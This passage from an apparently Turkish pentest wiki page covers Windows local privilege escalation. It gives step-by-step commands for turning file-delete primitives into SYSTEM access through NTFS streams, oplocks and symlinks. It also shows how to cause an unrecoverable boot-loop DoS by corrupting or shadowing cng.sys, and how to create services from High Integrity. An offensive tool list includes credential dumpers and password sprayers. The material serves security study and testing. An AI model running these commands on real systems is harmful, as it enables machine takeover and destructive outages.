- Hijack ettiğiniz DLL'i yükleyen trusted bir **auto-elevated binary** (ör. `osk.exe`) çalıştırın.
- **Boom**: Code'unuz **SYSTEM olarak** çalıştırılır.


### Arbitrary File Delete/Move/Rename'den SYSTEM EoP'ye

Ana MSI rollback tekniği (önceki teknik), **tam bir klasörü** (ör. `C:\Config.Msi`) silebildiğinizi varsayar. Peki ya vulnerability yalnızca **arbitrary file deletion** işlemine izin veriyorsa?

**NTFS internals**'ı exploit edebilirsiniz: her klasörün şu adla gizli bir alternate data stream'i vardır:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Bu stream, klasörün **index metadata** bilgilerini depolar.

Dolayısıyla bir klasörün **`::$INDEX_ALLOCATION` stream**'ini **silerseniz**, NTFS **klasörün tamamını** dosya sisteminden kaldırır.

Bunu aşağıdaki gibi standart dosya silme API'lerini kullanarak yapabilirsiniz:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Bir *file* delete API çağırıyor olsanız bile, **klasörün kendisini siler**.

### Klasör İçeriğini Silmeden SYSTEM EoP'ye
Primitive'in rastgele file/folder silmenize izin vermediğini, ancak **saldırganın kontrolündeki bir klasörün *içeriğini* silmenize izin verdiğini** varsayalım.

1. Adım: Yem klasörü ve file oluşturma
- Oluşturun: `C:\temp\folder1`
- İçine: `C:\temp\folder1\file1.txt`

2. Adım: `file1.txt` üzerine bir **oplock** yerleştirme
- Ayrıcalıklı bir süreç `file1.txt` dosyasını silmeye çalıştığında oplock **yürütmeyi duraklatır**.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Adım 3: SYSTEM process'ini tetikleyin (ör. `SilentCleanup`)
- Bu process klasörleri (ör. `%TEMP%`) tarar ve içeriklerini silmeye çalışır.
- `file1.txt` dosyasına ulaştığında **oplock tetiklenir** ve kontrolü callback'inize devreder.

4. Adım 4: Oplock callback içinde – silme işlemini yönlendirin

- Seçenek A: `file1.txt` dosyasını başka bir yere taşıyın
- Bu işlem, oplock'i bozmadan `folder1` klasörünü boşaltır.
- `file1.txt` dosyasını doğrudan silmeyin — bu, oplock'in vaktinden önce serbest bırakılmasına neden olur.

- Seçenek B: `folder1` klasörünü bir **junction**'a dönüştürün:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Seçenek C: `\RPC Control` içinde bir **symlink** oluşturun:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Bu, klasör meta verilerini depolayan NTFS iç akışını hedefler — bu akışı silmek klasörü siler.

5. Adım 5: Oplock'i serbest bırakma
- SYSTEM işlemi devam eder ve `file1.txt` dosyasını silmeye çalışır.
- Ancak şimdi, junction + symlink nedeniyle aslında şunu siliyor:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Sonuç**: `C:\Config.Msi`, SYSTEM tarafından silinir.

### Rastgele Klasör Oluşturmadan Kalıcı DoS'a

**Dosya yazamıyor** veya **zayıf izinler ayarlayamıyor** olsanız bile, **SYSTEM/admin olarak rastgele bir klasör oluşturmanıza** olanak tanıyan bir primitive'i exploit edin.

Bir **dosya değil, klasör** oluşturun ve bu klasöre **kritik bir Windows driver'ının** adını verin, örneğin:
```
C:\Windows\System32\cng.sys
```
- Bu path normalde `cng.sys` kernel-mode driver'ına karşılık gelir.
- Eğer **önceden bir folder olarak oluşturulursa**, Windows boot sırasında gerçek driver'ı yükleyemez.
- Ardından Windows boot sırasında `cng.sys` dosyasını yüklemeye çalışır.
- Folder'ı görür, **gerçek driver'ı çözümleyemez** ve **boot işlemini çökertebilir veya durdurabilir**.
- **Fallback yoktur** ve harici müdahale (ör. boot repair veya disk erişimi) olmadan **recovery mümkün değildir**.

### Privileged log/backup paths + OM symlinks'ten arbitrary file overwrite / boot DoS'a

Bir **privileged service**, log/export işlemlerini **writable config**'den okunan bir path'e yazdığında, **SeCreateSymbolicLinkPrivilege olmadan bile**, privileged write işlemini arbitrary overwrite'a dönüştürmek için bu path'i **Object Manager symlinks + NTFS mount points** ile yönlendirin.

**Requirements**
- Target path'i depolayan config'in attacker tarafından writable olması (ör. `%ProgramData%\...\.ini`).
- `\RPC Control` için bir mount point ve bir OM file symlink oluşturma yeteneği (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Bu path'e yazan bir privileged operation (log, export, report).

**Example chain**
1. Privileged log destination'ı kurtarmak için config'i okuyun; ör. `C:\ProgramData\ICONICS\IcoSetup64.ini` içindeki `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`.
2. Path'i admin olmadan yönlendirin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Privileged component'ın log'u yazmasını bekleyin (ör. admin "test SMS gönder" işlemini tetikler). Yazma işlemi artık `C:\Windows\System32\cng.sys` konumuna gerçekleşir.
4. Üzerine yazılmış hedefi (hex/PE parser) inceleyerek bozulmayı doğrulayın; yeniden başlatma, Windows'un değiştirilmiş driver path'ini yüklemesini zorlar → **boot loop DoS**. Bu yöntem, privileged bir service'in yazma amacıyla açacağı tüm korumalı dosyalara da uygulanabilir.

> `cng.sys` normalde `C:\Windows\System32\drivers\cng.sys` konumundan yüklenir; ancak `C:\Windows\System32\cng.sys` konumunda bir kopya varsa önce bu kopya denenebilir ve bozuk veri için güvenilir bir DoS hedefi hâline gelir.



## **High Integrity'den System'e**

### **New service**

Zaten bir High Integrity process çalıştırıyorsanız, **SYSTEM'e giden yol** yeni bir service **oluşturup çalıştırarak** kolayca elde edilebilir:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Bir service binary oluştururken bunun geçerli bir service olduğundan veya binary'nin gerekli işlemleri yeterince hızlı gerçekleştirdiğinden emin olun; geçerli bir service değilse 20 saniye içinde sonlandırılır.

### AlwaysInstallElevated

High Integrity process içinden **AlwaysInstallElevated registry entries**'larını **enable etmeyi** ve _**.msi**_ wrapper kullanarak bir reverse shell **install etmeyi** deneyebilirsiniz.\
[İlgili registry keys ve bir _.msi_ package'ın nasıl install edileceği hakkında daha fazla bilgi burada.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Kodu** [**burada bulabilirsiniz**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Bu token privileges'larına sahipseniz (muhtemelen bunu zaten High Integrity olan bir process içinde bulacaksınız), SeDebug privilege ile (protected processes dışındaki) **neredeyse tüm process'leri açabilecek**, process'in **token'ını kopyalayabilecek** ve bu **token ile rastgele bir process oluşturabileceksiniz**.\
Bu technique genellikle **tüm token privileges'larına sahip SYSTEM olarak çalışan herhangi bir process** (_evet, tüm token privileges'larına sahip olmayan SYSTEM process'leri bulabilirsiniz_) **seçilerek** kullanılır.\
**Önerilen technique'i çalıştıran bir kod örneğini** [**burada bulabilirsiniz**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Bu technique, `getsystem` içinde privilege escalation yapmak için meterpreter tarafından kullanılır. Technique, **bir pipe oluşturulmasını ve ardından bu pipe'a yazmak için bir service oluşturulmasını/kötüye kullanılmasını** içerir. Ardından pipe'ı **`SeImpersonate`** privilege'ını kullanarak oluşturan **server**, pipe client'ının (service) **token'ını impersonate ederek** SYSTEM privileges elde edebilir.\
Name pipes hakkında [**daha fazla bilgi edinmek istiyorsanız bunu okumalısınız**](#named-pipe-client-impersonation).\
Name pipes kullanarak high integrity'den System'e **nasıl geçileceğine dair bir örnek** okumak istiyorsanız [**bunu okumalısınız**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

**SYSTEM** olarak çalışan bir **process** tarafından **yüklenen** bir dll'i **hijack etmeyi** başarırsanız, bu permissions ile rastgele kod çalıştırabilirsiniz. Bu nedenle Dll Hijacking bu tür privilege escalation için de kullanışlıdır; ayrıca **high integrity process'ten gerçekleştirilmesi çok daha kolaydır**, çünkü dll'leri yüklemek için kullanılan klasörlerde **write permissions**'a sahip olacaktır.\
**Dll hijacking hakkında** [**daha fazla bilgi edinebilirsiniz**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Okuyun:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Daha fazla yardım

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Kullanışlı araçlar

**Windows local privilege escalation vectors aramak için en iyi tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- misconfigurations ve sensitive files kontrolü (**[**buradan kontrol edin**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Tespit edildi.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- bazı olası misconfigurations'ları kontrol eder ve bilgi toplar (**[**buradan kontrol edin**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- misconfigurations kontrolü**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla ve RDP saved session information'ı extract eder. Local'de -Thorough kullanın.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager'dan credentials extract eder. Tespit edildi.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- toplanan password'ları domain genelinde spray eder**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh, bir PowerShell ADIDNS/LLMNR/mDNS spoofer ve man-in-the-middle tool'udur.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Temel privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Bilinen privesc vulnerabilities'lerini arar (Watson için DEPRECATED)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Admin rights gerekir)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Bilinen privesc vulnerabilities'lerini arar (VisualStudio kullanılarak compile edilmesi gerekir) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- misconfigurations aramak için host'u enumerate eder (privesc'ten çok bilgi toplama tool'udur) (compile edilmesi gerekir) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- çok sayıda software'den credentials extract eder (github'da precompiled exe)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp'ın C# port'u**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- misconfiguration kontrolü (github'da executable precompiled). Önerilmez. Win10'da iyi çalışmaz.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- olası misconfigurations'ları kontrol eder (python'dan exe). Önerilmez. Win10'da iyi çalışmaz.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Bu post temel alınarak oluşturulan tool (düzgün çalışması için accesschk erişimi gerekmez, ancak kullanabilir).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** çıktısını okur ve çalışan exploit'leri önerir (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** çıktısını okur ve çalışan exploit'leri önerir (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Projeyi doğru .NET sürümünü kullanarak compile etmelisiniz ([**buraya bakın**](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Victim host üzerinde kurulu .NET sürümünü görmek için şunu çalıştırabilirsiniz:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Referanslar

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: SMTP üzerinden Word VBA macro phishing → hMailServer kimlik bilgisi şifre çözme → SYSTEM için Veeam CVE-2023-27532](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) ve kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Silver Fox'un Peşinde: Kernel Shadows'da Kedi ve Fare](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Bir SCADA Sisteminde Bulunan Privileged File System Vulnerability](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink kullanımı](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [Geçmişe Bir Link. Windows'ta Symbolic Link'lerin Kötüye Kullanılması](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF portu)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: Windows'ta Dangerous Module Resolution](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Node.js modules: `node_modules` klasörlerinden yükleme](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [Trail of Bits - C/C++ checklist challenges, çözümleri](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [Microsoft Learn - RtlQueryRegistryValues function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)

{{#include ../../banners/hacktricks-training.md}}
